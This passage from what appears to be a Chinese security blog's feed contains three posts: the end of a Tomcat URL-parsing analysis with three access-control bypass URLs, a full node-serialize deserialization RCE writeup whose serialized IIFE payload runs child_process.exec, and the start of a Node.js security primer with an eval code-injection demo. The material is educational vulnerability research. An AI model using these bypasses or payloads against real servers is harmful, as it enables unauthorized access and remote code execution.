href="#getRequestURL-的处理" class="headerlink" title="getRequestURL()的处理"></a>getRequestURL()的处理</h3><p>在getRequestURL()函数中是调用了Request.getRequestURL()函数的：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/24.png" alt=""></p><p>跟进该函数，在提取了协议类型、host和port之后，调用了getRequestURI()函数获取URL请求的路径，然后直接拼接进URL直接返回而不做包括URL解码的任何处理：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/25.png" alt=""></p><h3 id="getServletPath-的处理"><a href="#getServletPath-的处理" class="headerlink" title="getServletPath()的处理"></a>getServletPath()的处理</h3><p>在getServletPath()函数中是调用了Request.getServletPath()函数的：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/21.png" alt=""></p><p>跟进去，看到是直接返回前面Tomcat已经处理过后的提取处理的Servlet路径，注意这里是获取MappingData类对象中的wrapperPath属性值：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/22.png" alt=""></p><h3 id="getPathInfo-的处理"><a href="#getPathInfo-的处理" class="headerlink" title="getPathInfo()的处理"></a>getPathInfo()的处理</h3><p>和getServletPath()函数的处理是一样的，同样是返回前面经过Tomcat解析处理后的MappingData类对象中其中一个属性值，这里是获取的pathInfo属性值并直接返回：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/23.png" alt=""></p><h3 id="getContextPath-的处理"><a href="#getContextPath-的处理" class="headerlink" title="getContextPath()的处理"></a>getContextPath()的处理</h3><p>在getContextPath()函数中，调用了Request.getContextPath()函数：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/26.png" alt=""></p><p>跟进该函数，先是调用getServletContext().getContextPath()来获取当前Servlet上下文路径以及调用getRequestURI()函数获取当前请求的目录路径：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/27.png" alt=""></p><p>往下的这段循环是处理uri变量值中如果存在多个连续的<code>/</code>则删除掉：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/28.png" alt=""></p><p>再往下，获取下一个<code>/</code>符号的位置，然后根据该位置索引对uri变量值进行工程名的切分提取：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/29.png" alt=""></p><p>接着，就是对刚刚切分得到的candidate变量进行和Tomcat一样的特殊字符处理过程，先调用removePathParameters()处理<code>;</code>和<code>.</code>，然后进行URL解码，再调用normalize()函数进行标准化处理，处理过后比较处理完的candidate变量值和之前获取的规范上下文路径是否一致，不一致的话就循环继续前面的操作直至一致为止：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/30.png" alt=""></p><p>最后，直接返回按pos索引切分的uri变量值：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/31.png" alt=""></p><h2 id="0x04-攻击利用"><a href="#0x04-攻击利用" class="headerlink" title="0x04 攻击利用"></a>0x04 攻击利用</h2><p>看个访问限制绕过的场景。</p><p>假设Tomcat上启动的Web目录下存在一个info目录，其中有一个secret.jsp文件，其中包含敏感信息等：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Secret&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">username: mi1k7ea&lt;br&gt;</span><br><span class="line">password: <span class="number">123456</span>&lt;br&gt;</span><br><span class="line">address: china&lt;br&gt;</span><br><span class="line">phone: <span class="number">13666666666</span>&lt;br&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>新建一个filter包，其中新建一个testFilter类，实现Filter接口类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest;</span><br><span class="line">        HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse;</span><br><span class="line"></span><br><span class="line">        String url = httpServletRequest.getRequestURI();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (url.startsWith(<span class="string">"/urltest/info"</span>)) &#123;</span><br><span class="line">            httpServletResponse.getWriter().write(<span class="string">"No Permission."</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个Filter作用是：只要访问/urltest/info目录下的资源，都需要进行权限判断，否则直接放行。可以看到，这里调用getRequestURI()函数来获取请求中的URL目录路径，然后调用startsWith()函数判断是否是访问的敏感目录，若是则返回无权限的响应。当然这里写得非常简单，只做演示用。</p><p>编辑web.xml，添加testFilter设置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>filter.testFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行之后，访问<code>http://localhost:8080/urltest/info/secret.jsp</code>，会显示无权限：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/17.png" alt=""></p><p>根据前面的分析构造如下几个payload都能成功绕过认证限制来访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/urltest/./info/secret.jsp</span><br><span class="line">http://localhost:8080/urltest/;mi1k7ea/info/secret.jsp</span><br><span class="line">http://localhost:8080/urltest/mi1k7ea/../info/secret.jsp</span><br></pre></td></tr></table></figure><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/18.png" alt=""></p><p>整个的过程大致如此，就是利用解析的差异性来绕过认证。</p><p>在前段时间爆出的Apache Shiro的CVE中，就是使用getRequestURI()函数导致的，这里可以看到人家的补丁是怎么打的，其实就是用getPathInfo()替换掉就OK了：<a href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce" target="_blank" rel="noopener">https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce</a></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://joychou.org/web/security-of-getRequestURI.html" target="_blank" rel="noopener">getRequestURI()带来的安全问题</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Tomcat" scheme="https://www.mi1k7ea.com/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>node-serialize反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/03/29/node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/03/29/node-serialize反序列化漏洞/</id>
    <published>2020-03-29T15:05:59.000Z</published>
    <updated>2020-03-29T16:02:10.462Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Node.js在node-serialize模块中存在反序列化漏洞，若unserialize()函数参数外部可控，则通过IIFE（Immediately Invoked Function Expression）可以实现RCE。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>需要安装node-serialize模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install node-serialize</span><br></pre></td></tr></table></figure><h2 id="0x03-序列化"><a href="#0x03-序列化" class="headerlink" title="0x03 序列化"></a>0x03 序列化</h2><p>序列化代码如下，serialize.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y = &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Serialized:\n"</span> + s.serialize(y));</span><br></pre></td></tr></table></figure><p>变量y是一段payload，用于启动一个子线程来执行calc命令，这里输出序列化后的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;node serialize.js</span><br><span class="line">Serialized:</span><br><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-IIFE"><a href="#0x04-IIFE" class="headerlink" title="0x04 IIFE"></a>0x04 IIFE</h2><p>前面得到了序列化的字符串之后，就可以用unserialize()函数进行反序列化了。那么问题来了，怎么代码执行呢？这就用到了JavaScript的IIFE了。</p><p>IIFE（Immediately Invoked Function Expression）立即调用的函数表达式，即声明函数的同时立即调用该函数，目的是为了隔离作用域，防止污染全局命名空间。</p><p>IIFE一般有如下两种写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123; /* code /* &#125;());</span><br><span class="line">(function()&#123; /* code /* &#125;)();</span><br></pre></td></tr></table></figure><p>有时，我们需要在定义函数之后，立即调用该函数。此时，你不能再函数的定义之后加上圆括号，这是因为会产生语法错误，错误原因是function这个关键字既可以当作语句，也可以当作表达式。为了避免其余，规定function关键字出现在行首时，解释为语句。因此，若是以function开头的代码则必须像前面一样的写法才能成功在定义时被当作表达式执行。</p><p>写下Demo试下，下面两种形式都能成功弹计算器：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;());</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/node-serialize反序列化漏洞/1.png" alt=""></p><p>在前面序列化的代码serialize.js中，要想在序列化时直接执行该函数，可以将代码修改如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> y = &#123;</span><br><span class="line">poc : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123; <span class="built_in">console</span>.log(stdout) &#125;);</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Serialized:\n"</span> + s.serialize(y));</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/node-serialize反序列化漏洞/2.png" alt=""></p><h2 id="0x05-反序列化触发RCE"><a href="#0x05-反序列化触发RCE" class="headerlink" title="0x05 反序列化触发RCE"></a>0x05 反序列化触发RCE</h2><p>前面序列化得到如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><p>在此基础上，为了在服务端进行反序列化操作的时候能触发RCE，我们直接在函数定义的后面追加<code>()</code>来构造即可（为啥能这么构造后面会说到）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&apos;child_process&apos;).exec(&apos;calc&apos;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;()&quot;&#125;</span><br></pre></td></tr></table></figure><p>反序列化代码如下，unserialize.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">'&#123;"function":"_$$ND_FUNC$$_function()&#123;\\r\\n\\t\\trequire(\'child_process\').exec(\'calc\', function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\\r\\n\\t&#125;()"&#125;'</span></span><br><span class="line"></span><br><span class="line">s.unserialize(payload);</span><br></pre></td></tr></table></figure><p>运行即可触发RCE弹计算器：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/3.png" alt=""></p><h2 id="0x06-漏洞分析"><a href="#0x06-漏洞分析" class="headerlink" title="0x06 漏洞分析"></a>0x06 漏洞分析</h2><p>我们看源码，位于NodeJS\node_modules\node-serialize\lib\serialize.js，其中反序列化相关的代码如下：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/4.png" alt=""></p><p>这里当解析到将要反序列化的内容中的键值为string类型时，判断是否包含FUNCFLAG变量值即<code>_$$ND_FUNC$$_</code>，在前面的代码中有定义，该值表明其中的内容是个函数：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/5.png" alt=""></p><p>回到前面的if判断条件中往下走，若是则调用76行中的eval()方法来执行其中的语句。同时，由于JS的IIFE，使得刚刚定义的恶意函数就能够马上得以执行，从而RCE。</p><p>有个疑问，为啥这里不需要向前面IIFE小节中说的给function定义加<code>()</code>使其不是function开头呢？我们看到eval()那行代码：</p><p><img src="/2020/03/29/node-serialize反序列化漏洞/6.png" alt=""></p><p>明显看到，它已经给我们的整个的function给加上了括号括起来，我们只需要在函数定义后面加上<code>()</code>即可满足IIFE的其中一种格式，从而成功RCE。</p><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://paper.seebug.org/213/" target="_blank" rel="noopener">利用 Node.js 反序列化漏洞远程执行代码</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/categories/JavaScript/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/tags/JavaScript/"/>
    
      <category term="Node.js" scheme="https://www.mi1k7ea.com/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>浅析Node.js安全</title>
    <link href="https://www.mi1k7ea.com/2020/03/29/%E6%B5%85%E6%9E%90Node-js%E5%AE%89%E5%85%A8/"/>
    <id>https://www.mi1k7ea.com/2020/03/29/浅析Node-js安全/</id>
    <published>2020-03-29T04:17:06.000Z</published>
    <updated>2020-04-29T13:32:03.863Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Node.js是一个基于Chrome V8引擎的JavaScript运行环境。Node.js使用了一个事件驱动、非阻塞式I/O的模型。</p><p>Node是一个让JavaScript运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby等服务端语言平起平坐的脚本语言。实质是对Chrome V8引擎进行了封装。</p><p>Node对一些特殊用例进行优化，提供替代的API，使得V8在非浏览器环境下运行得更好。V8引擎执行Javascript的速度非常快，性能非常好。Node是一个基于Chrome JavaScript运行时建立的平台， 用于方便地搭建响应速度快、易于扩展的网络应用。Node 使用事件驱动， 非阻塞I/O 模型而得以轻量和高效，非常适合在分布式设备上运行数据密集型的实时应用。</p><h3 id="环境安装、基础语法与特性"><a href="#环境安装、基础语法与特性" class="headerlink" title="环境安装、基础语法与特性"></a>环境安装、基础语法与特性</h3><p>参考：<a href="https://www.runoob.com/nodejs/nodejs-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/nodejs/nodejs-tutorial.html</a></p><h3 id="第一个应用"><a href="#第一个应用" class="headerlink" title="第一个应用"></a>第一个应用</h3><p>Node.js应用由以下三部分组成：</p><ol><li>引入required模块：我们可以使用require指令来载入Node.js模块。</li><li>创建服务器：服务器可以监听客户端的请求，类似于Apache、Nginx等HTTP服务器。</li><li>接收请求与响应请求：服务器很容易创建，客户端可以使用浏览器或终端发送HTTP请求，服务器接收请求后返回响应数据。</li></ol><p>直接看下代码实现，test.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入required模块</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建服务器</span></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送 HTTP 头部 </span></span><br><span class="line">    <span class="comment">// HTTP 状态值: 200 : OK</span></span><br><span class="line">    <span class="comment">// 内容类型: text/plain</span></span><br><span class="line">    response.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送响应数据 "Mi1k7ea"</span></span><br><span class="line">    response.end(<span class="string">'Mi1k7ea\n'</span>);</span><br><span class="line">&#125;).listen(<span class="number">666</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终端打印如下信息</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://127.0.0.1:666/'</span>);</span><br></pre></td></tr></table></figure><p>直接用node命令运行即可：</p><p><img src="/2020/03/29/浅析Node-js安全/1.png" alt=""></p><h3 id="Express框架"><a href="#Express框架" class="headerlink" title="Express框架"></a>Express框架</h3><p>Express是一个简洁而灵活的Node.js Web应用框架，提供了一系列强大特性帮助你创建各种Web应用，和丰富的HTTP工具。</p><p>使用Express可以快速地搭建一个完整功能的网站。</p><p>Express框架核心特性：</p><ul><li>可以设置中间件来响应HTTP请求。</li><li>定义了路由表用于执行不同的HTTP请求动作。</li><li>可以通过向模板传递参数来动态渲染HTML页面。</li></ul><p>Express的安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install express --save</span><br><span class="line">npm install body-parser --save</span><br><span class="line">npm install cookie-parser --save</span><br><span class="line">npm install multer --save</span><br></pre></td></tr></table></figure><p>以上命令会将Express框架以及几个重要的模块一起安装在node_modules目录中，node_modules目录下会自动创建express目录。几个重要的模块介绍如下：</p><ul><li><strong>body-parser</strong> - node.js 中间件，用于处理 JSON, Raw, Text 和 URL 编码的数据。</li><li><strong>cookie-parser</strong> - 这就是一个解析Cookie的工具。通过req.cookies可以取到传过来的cookie，并把它们转成对象。</li><li><strong>multer</strong> - node.js 中间件，用于处理 enctype=”multipart/form-data”（设置表单的MIME编码）的表单数据。</li></ul><p>安装完后，我们可以查看下express使用的版本号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;npm list express</span><br><span class="line">E:\</span><br><span class="line">`-- express@4.17.1</span><br></pre></td></tr></table></figure><p>Demo应用，express_demo.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"> </span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">   res.send(<span class="string">'Express Test'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8888</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">var</span> host = server.address().address</span><br><span class="line">  <span class="keyword">var</span> port = server.address().port</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"应用实例，访问地址为 http://%s:%s"</span>, host, port)</span><br><span class="line"> </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>接着用命令<code>node express_demo.js</code>运行即可访问。</p><p>在页面中访问，可以看到响应报文中有个X-Powered-By头，其值为Express，也就是说，在日常的抓包中看到该头字段即可知道是使用的Node.js的Express框架：</p><p><img src="/2020/03/29/浅析Node-js安全/2.png" alt=""></p><h2 id="0x02-Node-js安全"><a href="#0x02-Node-js安全" class="headerlink" title="0x02 Node.js安全"></a>0x02 Node.js安全</h2><p>Node.js中的Web安全问题和传统的Web安全问题都是一样的，只是代码实现上有语法的差异而已。</p><h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>Node.js同样存在代码注入问题，需要重点关注eval、setInteval、setTimeout、new Function等函数的参数是否外部可控。</p><p>示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">eval</span>(req.query.a);</span><br><span class="line"><span class="keyword">var</span> b = <span class="built_in">eval</span>(req.query.b);</span><br><span class="line"><span class="keyword">var</span> r = a + b;</span><br><span class="line">res.send(<span class="string">'Sum a+b='</span> + r);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p>强制应用退出的payload如下，执行之后Express服务就终止了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 